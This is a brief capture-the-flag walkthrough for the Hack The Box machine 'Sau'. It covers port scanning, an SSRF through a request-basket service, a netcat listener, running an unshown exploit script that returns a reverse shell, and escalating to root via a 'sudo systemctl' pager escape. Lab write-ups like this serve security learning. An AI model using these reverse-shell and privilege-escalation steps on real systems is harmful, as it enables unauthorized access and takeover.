# HTB_Sau
Walkthrough Hack The Box: Sau

# IP: 10.10.11.224

# Step 1: Scanning

 $ rustscan -a 10.10.11.224

 $ sudo nmap -sC -sV -oN map.txt 10.10.11.224

 # Step 2:

 Access website

 http://10.10.11.224:55555/web

 Create your basket

 Open basket configuration setting and enter loopback IP http://127.0.0.1:80/ & tick all boxes

 Copy the link Generated: http://10.10.11.224:55555/abhishek

 # Step 3:

 Open two terminals A & B

 ## Terminal A:
Start Listener
$ nc -lnvp 9999

 ## Terminal B:
 Run exploit 

 $ python3 sau_script.py 10.10.14.158 9999 http://10.10.11.224:55555/abhishek 

 ## Back to Terminal A: Reverse Shell Opened

ls

cat root.txt

cd

sudo -l

sudo systemctl status trail.service

!sh -> to terminate

cd

ls

cat root.txt



 
